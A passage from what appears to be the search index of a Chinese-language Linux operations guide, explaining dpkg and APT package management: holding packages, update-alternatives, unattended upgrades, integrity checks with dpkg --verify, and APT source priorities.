&lt;file&gt;</code> \u200b\u53ef\u4ee5\u200b\u67e5\u627e\u200b\u6240\u6709\u200b\u5df2\u200b\u5b89\u88c5\u5305\u200b\u4e2d\u200b\u7684\u200b\u6587\u4ef6\u200b\u3002</li> <li><code>dpkg-deb -c &lt;name_version.deb&gt;</code> \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b <code>.deb</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</li> <li><code>dpkg-query -L &lt;name&gt;</code> \u200b\u67e5\u770b\u200b\u7ed9\u5b9a\u200b\u7684\u200b\u5b89\u88c5\u200b\u4e86\u200b\u7684\u200b\u5305\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u6587\u4ef6\u200b\u3002</li> </ul> <p>\u200b\u8fd9\u200b\u51e0\u6761\u200b\u547d\u4ee4\u200b\u7684\u200b <code>dpkg-*</code> \u200b\u90e8\u5206\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u66ff\u6362\u200b\u4e3a\u200b <code>dpkg</code>\uff0c\u200b\u4f8b\u5982\u200b <code>dpkg -S</code>\u3001<code>dpkg -c</code> \u200b\u7b49\u200b\uff0c<code>dpkg</code> \u200b\u547d\u4ee4\u200b\u524d\u7aef\u200b\u4f1a\u200b\u5e2e\u200b\u4f60\u200b\u628a\u200b\u8bf7\u6c42\u200b\u8f6c\u53d1\u200b\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u5b50\u200b\u547d\u4ee4\u200b\u4e0a\u200b\u3002</p>"},{"location":"ops/package/#apt-hold","title":"\u56fa\u5b9a\u200b\u5305","text":"<p>\u200b\u6709\u65f6\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u56fa\u5b9a\u200b\u4e00\u4e2a\u5305\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u8fd9\u4e2a\u200b\u5305\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5b89\u88c5\u200b\u6216\u200b\u5347\u7ea7\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>\u200b\u6211\u4eec\u200b\u81ea\u884c\u200b\u6253\u5305\u200b\u4e86\u200b\u67d0\u4e2a\u200b\u6709\u200b bug \u200b\u7684\u200b\u5305\u200b\u7684\u200b\u4fee\u590d\u200b\u7248\u672c\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u7cfb\u7edf\u200b\u81ea\u52a8\u200b\u5347\u7ea7\u200b\u5230\u200b\u5b98\u65b9\u200b\u7684\u200b\u7248\u672c\u200b\u3002\u200b\u8fd9\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>apt-mark hold &lt;name&gt;</code> \u200b\u6765\u200b\u6807\u8bb0\u200b\u8fd9\u4e2a\u200b\u5305\u4e3a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u3002</li> <li> <p>\u200b\u6211\u4eec\u200b\u4e0d\u200b\u5e0c\u671b\u200b Ubuntu \u200b\u670d\u52a1\u5668\u200b\u5b89\u88c5\u200b Snap\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>apt-mark hold snapd</code> \u200b\u6765\u200b\u56fa\u5b9a\u200b\uff08\u200b\u963b\u6b62\u200b\uff09Snap \u200b\u7684\u200b\u5b89\u88c5\u200b\uff1a</p> <pre><code>$ sudo apt-mark hold snapd\n$ sudo apt install chromium\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nNote, selecting 'chromium-browser' instead of 'chromium'\nSome packages could not be installed. This may mean that you have\nrequested an impossible situation or if you are using the unstable\ndistribution that some required packages have not yet been created\nor been moved out of Incoming.\nThe following information may help to resolve the situation:\n\nThe following packages have unmet dependencies:\nchromium-browser : PreDepends: snapd but it is not going to be installed\nE: Unable to correct problems, you have held broken packages.\n</code></pre> </li> </ul> <p><code>apt-mark unhold</code> \u200b\u53ef\u4ee5\u200b\u53d6\u6d88\u200b\u56fa\u5b9a\u200b\uff0c\u200b\u800c\u200b <code>apt-mark showhold</code> \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u6240\u6709\u200b\u88ab\u200b\u56fa\u5b9a\u200b\u7684\u200b\u5305\u200b\u3002</p>"},{"location":"ops/package/#alternatives","title":"Alternatives","text":"<p>Debian \u200b\u7684\u200b Alternatives \u200b\u673a\u5236\u200b\u5141\u8bb8\u200b\u7cfb\u7edf\u200b\u5b89\u88c5\u200b\u540c\u4e00\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u591a\u4e2a\u200b\u7248\u672c\u200b\uff08\u200b\u4f8b\u5982\u200b Java\uff09\uff0c\u200b\u6216\u8005\u200b\u540c\u4e00\u200b\u7c7b\u578b\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u591a\u4e2a\u200b\u5b9e\u73b0\u200b\uff08\u200b\u4f8b\u5982\u200b\u6587\u672c\u7f16\u8f91\u200b\u5668\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u5207\u6362\u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b\u7684\u200b\u7248\u672c\u200b\u3002<code>/etc/alternatives/</code> \u200b\u76ee\u5f55\u200b\u5305\u542b\u200b\u4e86\u200b\u6240\u6709\u200b\u5728\u200b Alternatives \u200b\u673a\u5236\u200b\u4e0b\u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\u3002\u200b\u4ee5\u200b <code>editor</code> \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5728\u200b Debian \u200b\u4e0b\u200b <code>/usr/bin/editor</code> \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b <code>/etc/alternatives/editor</code> \u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\uff0c\u200b\u800c\u200b <code>/etc/alternatives/editor</code> \u200b\u6307\u5411\u200b\u7684\u200b\u5bf9\u8c61\u200b\u7531\u200b\u7528\u6237\u200b\u914d\u7f6e\u200b\u51b3\u5b9a\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b <code>update-alternatives</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u7ba1\u7406\u200b Alternatives \u200b\u673a\u5236\u200b\u7684\u200b\u6620\u5c04\u200b\uff1a</p> <pre><code>$ ls -lh /etc/alternatives/editor\nlrwxrwxrwx 1 root root 9 Aug  29 2022  /etc/alternatives/editor -&gt; /bin/nano\n$ sudo update-alternatives --config editor\nThere are 4 choices for the alternative editor (providing /usr/bin/editor).\n\n  Selection    Path                Priority   Status\n------------------------------------------------------------\n* 0            /bin/nano            40        auto mode\n  1            /bin/ed             -100       manual mode\n  2            /bin/nano            40        manual mode\n  3            /usr/bin/vim.basic   30        manual mode\n  4            /usr/bin/vim.tiny    15        manual mode\n\nPress &lt;enter&gt; to keep the current choice[*], or type selection number: 3\nupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/editor (editor) in manual mode\n$ ls -lh /etc/alternatives/editor\nlrwxrwxrwx 1 root root 18 Feb  9 15:54 /etc/alternatives/editor -&gt; /usr/bin/vim.basic\n</code></pre>"},{"location":"ops/package/#unattended-upgrade","title":"\u81ea\u52a8\u66f4\u65b0","text":"<p>\u200b\u4e00\u822c\u800c\u8a00\u200b\uff0c\u200b\u4f7f\u7528\u200b apt \u200b\u7684\u200b\u7cfb\u7edf\u200b\u9ed8\u8ba4\u200b\u5b89\u88c5\u200b\u4e86\u200b <code>unattended-upgrades</code> \u200b\u5305\u200b\uff0c\u200b\u5982\u679c\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u6ca1\u6709\u200b\uff0c\u200b\u5b89\u88c5\u200b\u8be5\u5305\u200b\u5373\u53ef\u200b\u3002\u200b\u4e00\u4e9b\u200b Debian \u200b\u7cfb\u7edf\u200b\u955c\u50cf\u200b\u5728\u200b\u9884\u200b\u914d\u7f6e\u200b\u9636\u6bb5\u200b\u4f1a\u200b\u5173\u95ed\u200b\u81ea\u52a8\u66f4\u65b0\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u786e\u8ba4\u200b\uff08\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>debconf-utils</code> \u200b\u5305\u200b\uff09\uff1a</p> <pre><code>debconf-get-selections | grep unattended-upgrades/enable_auto_updates\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8f93\u51fa\u200b\u7684\u200b\u5185\u5bb9\u200b\u7c7b\u4f3c\u200b\u4e0b\u9762\u200b\uff1a</p> <pre><code>unattended-upgrades unattended-upgrades/enable_auto_updates boolean false\n</code></pre> <p>\u200b\u5219\u200b\u4ee3\u8868\u200b\u81ea\u52a8\u66f4\u65b0\u200b\u88ab\u200b\u5173\u95ed\u200b\uff0c\u200b\u53cd\u4e4b\u200b\u5219\u200b\u542f\u7528\u200b\u3002\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b <code>dpkg-reconfigure unattended-upgrades</code> \u200b\u4fee\u6539\u200b\u914d\u7f6e\u200b\u3002\u200b\u5f53\u200b\u81ea\u52a8\u66f4\u65b0\u200b\u542f\u7528\u200b\u65f6\u200b\uff0c<code>/etc/apt/apt.conf.d/20auto-upgrades</code> \u200b\u6587\u4ef6\u200b\u5e94\u5f53\u200b\u5b58\u5728\u200b\u3002<code>unattended-upgrades</code> \u200b\u9700\u8981\u200b\u7531\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u89e6\u53d1\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u4e0e\u200b APT \u200b\u66f4\u65b0\u200b\u76f8\u5173\u200b\u7684\u200b timer\uff08<code>apt-daily.timer</code> \u200b\u548c\u200b <code>apt-daily-upgrade.timer</code>\uff09\u200b\u5904\u4e8e\u200b\u542f\u7528\u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>sudo unattended-upgrades --dry-run --debug\n</code></pre> <p>\u200b\u67e5\u770b\u200b\u5e76\u200b\u786e\u8ba4\u200b\u7cfb\u7edf\u200b\u81ea\u52a8\u66f4\u65b0\u200b\u65f6\u200b\u7684\u200b\u884c\u4e3a\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u81ea\u52a8\u66f4\u65b0\u200b\u53ea\u4f1a\u200b\u64cd\u4f5c\u200b Debian \u200b\u5b98\u65b9\u200b\u4e0a\u6e38\u200b\u7684\u200b\u5305\u200b\uff0c\u200b\u7528\u6237\u200b\u81ea\u5df1\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u6e90\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u81ea\u52a8\u66f4\u65b0\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>/etc/apt/apt.conf.d/50unattended-upgrades</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u9a8c\u8bc1\u200b\uff1a</p> <pre><code>// Automatically upgrade packages from these (origin:archive) pairs\n//\n// Note that in Ubuntu security updates may pull in new dependencies\n// from non-security sources (e.g. chromium). By allowing the release\n// pocket these get automatically pulled in.\nUnattended-Upgrade::Allowed-Origins {\n    \"${distro_id}:${distro_codename}\";\n    \"${distro_id}:${distro_codename}-security\";\n    // Extended Security Maintenance; doesn't necessarily exist for\n    // every release and this system may not have it installed, but if\n    // available, the policy for updates is such that unattended-upgrades\n    // should also install from here by default.\n    \"${distro_id}ESMApps:${distro_codename}-apps-security\";\n    \"${distro_id}ESM:${distro_codename}-infra-security\";\n//  \"${distro_id}:${distro_codename}-updates\";\n//  \"${distro_id}:${distro_codename}-proposed\";\n//  \"${distro_id}:${distro_codename}-backports\";\n};\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0csystemd \u200b\u670d\u52a1\u200b <code>unattended-upgrades.service</code> \u200b\u4f1a\u200b\u786e\u4fdd\u200b\u7cfb\u7edf\u200b\u5728\u200b\u5173\u673a\u200b\u6216\u200b\u91cd\u542f\u200b\u524d\u200b\u6b63\u786e\u200b\u8fdb\u884c\u200b\u8f6f\u4ef6\u5305\u200b\u5347\u7ea7\u200b\u7684\u200b\u6536\u5c3e\u200b\u5de5\u4f5c\u200b\u3002\u200b\u56e0\u6b64\u200b\u4e5f\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u8be5\u200b\u670d\u52a1\u200b\u5df2\u200b\u542f\u52a8\u200b\u5e76\u4f1a\u200b\u5f00\u673a\u200b\u81ea\u542f\u200b\u3002</p>"},{"location":"ops/package/#apt-frontend","title":"APT \u200b\u524d\u7aef","text":"<p>APT \u200b\u9762\u5411\u7528\u6237\u200b\u4f7f\u7528\u200b\u7684\u200b\u524d\u7aef\u200b\u9664\u4e86\u200b <code>apt</code> \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b <code>apt-get</code>\u3001<code>aptitude</code> \u200b\u548c\u200b <code>synaptic</code> \u200b\u7b49\u200b\u3002\u200b\u5176\u4e2d\u200b <code>apt-get</code> \u200b\u662f\u200b\u65e9\u671f\u200b\u7684\u200b Debian \u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u5de5\u5177\u200b\uff0c\u200b\u57fa\u7840\u200b\u529f\u80fd\u200b\u4e0e\u200b <code>apt</code> \u200b\u7c7b\u4f3c\u200b\uff08\u200b\u5982\u200b <code>apt-get update</code>\u3001<code>apt-get install</code> \u200b\u7b49\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b\u7528\u6237\u200b\u4f53\u9a8c\u200b\u4e0d\u5982\u200b <code>apt</code> \u200b\u53cb\u597d\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5176\u200b\u4ea4\u4e92\u200b\u754c\u9762\u200b\u4e0d\u518d\u200b\u53d8\u5316\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4ec5\u200b\u9002\u7528\u200b\u4e8e\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u811a\u672c\u200b\u4ea4\u4e92\u200b\u7684\u200b\u573a\u666f\u200b\uff1b<code>synaptic</code> \u200b\u662f\u200b\u56fe\u5f62\u754c\u9762\u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u5de5\u5177\u200b\uff08\u200b\u4e2d\u6587\u540d\u200b\u4e3a\u200b\u300c\u200b\u65b0\u7acb\u200b\u5f97\u200b\u8f6f\u4ef6\u5305\u200b\u7ba1\u7406\u5668\u200b\u300d\uff09\u3002</p> <p></p> <p>Ubuntu 24.04 \u200b\u4e0b\u200b\u7684\u200b\u65b0\u7acb\u200b\u5f97\u200b\u8f6f\u4ef6\u5305\u200b\u7ba1\u7406\u5668\u200b\u622a\u56fe\u200b</p> <p><code>aptitude</code> \u200b\u63d0\u4f9b\u200b\u4e86\u200b TUI \u200b\u754c\u9762\u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u200b\u529f\u80fd\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u5bf9\u4e8e\u200b\u8fd0\u7ef4\u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u5176\u200b\u66f4\u52a0\u200b\u91cd\u8981\u200b\u7684\u200b\u662f\u200b\u76f8\u6bd4\u200b\u4e8e\u200b <code>apt</code> \u200b\u66f4\u200b\u7075\u6d3b\u200b\u7684\u200b\u4f9d\u8d56\u200b\u89e3\u6790\u200b\u529f\u80fd\u200b\u3002\u200b\u5728\u200b\u7cfb\u7edf\u200b\u51fa\u73b0\u200b\u635f\u574f\u200b\u5305\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c<code>apt</code> \u200b\u53ef\u80fd\u200b\u65e0\u6cd5\u200b\u63d0\u4f9b\u200b\u6709\u6548\u200b\u7684\u200b\u89e3\u51b3\u65b9\u6848\u200b\uff0c\u200b\u800c\u200b <code>aptitude</code> \u200b\u4f1a\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u591a\u79cd\u200b\u89e3\u6cd5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u7528\u6237\u200b\u9009\u62e9\u200b\u3002</p>"},{"location":"ops/package/#verify","title":"\u5b8c\u6574\u6027\u200b\u6821\u9a8c","text":"<p>dpkg \u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\u8fdb\u884c\u200b\u5b8c\u6574\u6027\u200b\u6821\u9a8c\u200b\u3002<code>dpkg --verify &lt;name&gt;</code> \u200b\u53ef\u4ee5\u200b\u6821\u9a8c\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7701\u7565\u200b <code>&lt;name&gt;</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u4ee5\u200b\u5bf9\u4e8e\u200b\u6240\u6709\u200b\u5305\u200b\u8fdb\u884c\u200b\u68c0\u67e5\u200b\u3002\u200b\u5982\u679c\u200b\u6000\u7591\u200b\u8f6f\u4ef6\u5305\u200b\u6587\u4ef6\u200b\u56e0\u200b\u610f\u5916\u200b\u88ab\u200b\u7834\u574f\u200b\uff08\u200b\u4f8b\u5982\u200b\u5728\u200b\u5347\u7ea7\u200b\u65f6\u200b\u65ad\u7535\u200b\uff0c\u200b\u6216\u200b\u8bef\u5220\u9664\u200b\u7b49\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8be5\u200b\u547d\u4ee4\u200b\u786e\u8ba4\u200b\u54ea\u4e9b\u200b\u8f6f\u4ef6\u5305\u200b\u9700\u8981\u200b\u91cd\u65b0\u5b89\u88c5\u200b\u3002</p> <p>\u200b\u68c0\u67e5\u200b\u67d0\u200b\u7cfb\u7edf\u200b\u5f3a\u5236\u200b\u91cd\u542f\u200b\u540e\u200b\u65e0\u6cd5\u200b\u5f00\u673a\u200b\u7684\u200b\u95ee\u9898\u200b</p> <p>\u200b\u4e00\u4e2a\u200b\u73b0\u5b9e\u200b\u53d1\u751f\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b\uff0c\u200b\u67d0\u200b\u7cfb\u7edf\u200b\u5f3a\u5236\u200b\u91cd\u542f\u200b\u540e\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5f00\u673a\u200b\uff0c\u200b\u63d0\u793a\u200b\uff1a</p> <pre><code>[    4.634427] systemd[1]: Assertion 'close_nointr(fd) != -EBADF' failed at src/basic/fd-util.c:77, function safe_close(). Aborting.\n[    4.635043] systemd[1]: Caught &lt;ABRT&gt; from our own process.\n[    4.635624] systemd[1]: Caught &lt;ABRT&gt;, core dump failed (child 225, code=killed, status=6/ABRT).\n[    4.635750] systemd[1]: Freezing execution.\n</code></pre> <p>\u200b\u4f7f\u7528\u200b ISO \u200b\u5f15\u5bfc\u200b\u540e\u200b <code>chroot</code> \u200b\u5230\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u6267\u884c\u200b <code>dpkg --verify</code>\uff0c\u200b\u53d1\u73b0\u200b\uff1a</p> <pre><code># dpkg --verify\n\uff08\u200b\u7701\u7565\u200b\uff09\n??5??????   /usr/lib/x86_64-linux-gnu/systemd/libsystemd-core-252.so\n</code></pre> <p>\u200b\u91cd\u65b0\u5b89\u88c5\u200b <code>libsystemd-shared</code> \u200b\u5305\u540e\u200b\uff0c\u200b\u95ee\u9898\u200b\u89e3\u51b3\u200b\u3002</p> <p><code>dpkg --verify</code> \u200b\u9ed8\u8ba4\u200b\u8f93\u51fa\u200b\u4e3a\u200b <code>rpm -V</code> \u200b\u98ce\u683c\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>??5??????   /some/file\n??5?????? c /some/config_file\nmissing     /some/missing_file\n</code></pre> <p><code>dpkg</code> \u200b\u76ee\u524d\u200b\u53ea\u4f1a\u200b\u68c0\u67e5\u200b\u6587\u4ef6\u200b\u7684\u200b MD5\uff08\u200b\u5373\u200b\u4e0a\u9762\u200b\u7684\u200b <code>5</code>\uff09\uff0c\u200b\u56e0\u6b64\u200b\u5176\u4ed6\u200b\u5217\u5747\u200b\u6807\u8bb0\u200b\u4e3a\u200b <code>?</code>\uff08\u200b\u672a\u200b\u68c0\u67e5\u200b\uff09\u3002<code>c</code> \u200b\u4ee3\u8868\u200b\u662f\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c<code>missing</code> \u200b\u4ee3\u8868\u200b\u6587\u4ef6\u200b\u4e0d\u200b\u5b58\u5728\u200b\u3002</p> <p><code>dpkg --verify</code> \u200b\u4e0d\u662f\u200b\u4e3a\u200b\u5b89\u5168\u6027\u200b\u7528\u9014\u200b\u8bbe\u8ba1\u200b\u7684\u200b</p> <p>\u200b\u5982\u679c\u200b\u6000\u7591\u200b\u653b\u51fb\u8005\u200b\u5df2\u7ecf\u200b\u6709\u200b\u5bf9\u5e94\u200b\u673a\u5668\u200b\u7684\u200b root \u200b\u6743\u9650\u200b\uff0c\u200b\u90a3\u4e48\u200b <code>dpkg --verify</code> \u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b\u4e0d\u53ef\u200b\u4fe1\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b <code>dpkg</code> \u200b\u672c\u8eab\u200b\uff0c\u200b\u6216\u8005\u200b\u4fee\u6539\u200b\u672c\u5730\u200b\u7684\u200b\u5305\u200b\u6570\u636e\u5e93\u200b\u3002</p>"},{"location":"ops/package/#priority","title":"\u8f6f\u4ef6\u200b\u4f18\u5148\u7ea7","text":"<p>\u200b\u6709\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u4f1a\u200b\u8bbe\u7f6e\u200b\u591a\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u6e90\u200b\uff0c\u200b\u800c\u200b\u8fd9\u4e9b\u200b\u6e90\u4f1a\u200b\u63d0\u4f9b\u200b\u76f8\u540c\u200b\u540d\u79f0\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>\u200b\u6b63\u5e38\u200b\u5b89\u88c5\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\uff0csecurity \u200b\u6e90\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u4e3b\u6e90\u200b\u5df2\u6709\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\uff0c\u200b\u5305\u542b\u200b\u5b89\u5168\u200b\u4fee\u590d\u200b\u7684\u200b\u66f4\u65b0\u200b\u7248\u672c\u200b\u3002</li> <li>\u200b\u5728\u200b stable \u200b\u7248\u672c\u200b\u7684\u200b Debian \u200b\u4e2d\u200b\u6dfb\u52a0\u200b backports \u200b\u6e90\u200b\uff0c\u200b\u4ee5\u200b\u83b7\u53d6\u200b\u4e00\u4e9b\u200b\u6765\u81ea\u200b testing \u200b\u7684\u200b\uff0c\u200b\u5728\u200b stable \u200b\u4e0b\u200b\u91cd\u65b0\u200b\u7f16\u8bd1\u200b\u7684\u200b\u65b0\u200b\u7248\u672c\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u3002</li> <li>Ubuntu \u200b\u6e90\u4e2d\u200b\u7684\u200b <code>firefox</code> \u200b\u4e3a\u200b Snap \u200b\u5305\u200b\uff0c\u200b\u800c\u200b\u6765\u81ea\u200b Mozilla \u200b\u7684\u200b APT \u200b\u4ed3\u5e93\u200b\u7684\u200b <code>firefox</code> \u200b\u4e3a\u200b\u539f\u751f\u200b\u7684\u200b deb \u200b\u5305\u200b\uff08Mozilla \u200b\u7684\u200b\u5e2e\u52a9\u200b\u4fe1\u606f\u200b\uff09\u3002</li> </ul> <p>APT \u200b\u9009\u62e9\u200b\u5305\u200b\u7684\u200b\u903b\u8f91\u200b\u5e76\u975e\u200b\u5355\u7eaf\u200b\u7684\u200b\u300c\u200b\u7248\u672c\u200b\u8d8a\u65b0\u8d8a\u200b\u597d\u200b\u300d\uff08\u200b\u6bd4\u5982\u200b\uff0c\u200b\u7528\u6237\u200b\u6dfb\u52a0\u200b backports \u200b\u6e90\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u7528\u6237\u200b\u5e0c\u671b\u200b\u6240\u6709\u200b backports \u200b\u6709\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u90fd\u200b\u5b89\u88c5\u200b\u6700\u65b0\u200b\u7248\u672c\u200b\uff09\uff0c\u200b\u800c\u662f\u200b\u6839\u636e\u200b\u4f18\u5148\u7ea7\u200b\u6765\u200b\u9009\u62e9\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u4e3a\u200b 500\uff0c\u200b\u5982\u679c\u200b\u4f18\u5148\u7ea7\u200b\u4e00\u81f4\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u6839\u636e\u200b\u7248\u672c\u53f7\u200b\u6765\u200b\u9009\u62e9\u200b\u3002</p> <p>Backports \u200b\u6e90\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u4e3a\u200b 100\uff0c\u200b\u56e0\u4e3a\u200b\u5176\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b <code>NotAutomatic</code> \u200b\u548c\u200b <code>ButAutomaticUpgrades</code> \u200b\u5b57\u6bb5\u200b\u90fd\u200b\u4e3a\u200b <code>yes</code>\uff0c\u200b\u56e0\u6b64\u200b APT \u200b\u4f1a\u200b\u6388\u4e88\u200b backports 100 \u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u3002\u200b\u5982\u679c\u200b\u53ea\u6709\u200b <code>NotAutomatic</code> \u200b\u4e3a\u200b <code>yes</code>\uff0c\u200b\u5219\u200b\u4f18\u5148\u7ea7\u200b\u4e3a\u200b 1\u3002</p> <p>\u200b\u6211\u4eec\u200b\u901a\u8fc7\u200b <code>apt-cache policy &lt;name&gt;</code> \u200b\u67e5\u770b\u200b\u5305\u200b\u7684\u200b\u5b89\u88c5\u200b\u72b6\u6001\u200b\u4e0e\u200b\u4f18\u5148\u7ea7\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4ee5\u200b\u67d0\u200b\u914d\u7f6e\u200b\u4e86\u200b backports\u3001deb-multimedia\uff0c\u200b\u5e76\u4e14\u200b\u6709\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u672a\u200b\u5347\u7ea7\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e3a\u4f8b\u200b\uff1a</p> <pre><code>$ apt-cache policy yt-dlp\nyt-dlp:\n  Installed: 1:2024.10.07-dmo1\n  Candidate: 1:2025.01.26-dmo1\n  Version table:\n     1:2025.01.26-dmo1 500\n        500 http://mirrors.ustc.edu.cn/deb-multimedia bookworm/main amd64 Packages\n *** 1:2024.10.07-dmo1 100\n        100 /var/lib/dpkg/status\n     2025.01.26-1~bpo12+1 100\n        100 http://mirrors.ustc.edu.cn/debian bookworm-backports/main amd64 Packages\n     2023.03.04-1 500\n        500 http://mirrors.ustc.edu.cn/debian bookworm/main amd64 Packages\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cAPT \u200b\u5df2\u77e5\u200b\u56db\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b <code>yt-dlp</code> \u200b\u7248\u672c\u200b\uff0c\u200b\u5206\u522b\u200b\u662f\u200b deb-multimedia \u200b\u7684\u200b <code>1:2025.01.26-dmo1</code>\u3001\u200b\u672c\u5730\u200b\u5b89\u88c5\u200b\u7684\u200b <code>1:2024.10.07-dmo1</code>\u3001backports \u200b\u7684\u200b <code>2025.01.26-1~bpo12+1</code> \u200b\u4ee5\u53ca\u200b\u5b98\u65b9\u200b\u6e90\u200b\u7684\u200b <code>2023.03.04-1</code>\u3002\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u672c\u5730\u200b\u7684\u200b\u7248\u672c\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u4e3a\u200b 100\u3002\u200b\u56e0\u6b64\u200b\u5f53\u200b\u6267\u884c\u200b\u66f4\u65b0\u200b\u547d\u4ee4\u200b\u65f6\u200b\uff0cAPT \u200b\u4f1a\u200b\u9996\u5148\u200b\u9009\u62e9\u200b\u4f18\u5148\u7ea7\u200b\u6700\u9ad8\u200b\u7684\u200b\uff08<code>deb-multimedia</code> \u200b\u6216\u8005\u200b\u5b98\u65b9\u200b\u6e90\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u9009\u62e9\u200b\u7248\u672c\u200b\u6700\u9ad8\u200b\u7684\u200b\uff08<code>1:2025.01.26-dmo1</code>\uff09\u3002</p> <p>\u200b\u5982\u679c\u200b\u672c\u5730\u200b\u7684\u200b\u7248\u672c\u200b\u6bd4\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u7248\u672c\u200b\u66f4\u9ad8\u200b\u2026\u2026</p> <p>\u200b\u6b64\u65f6\u200b APT 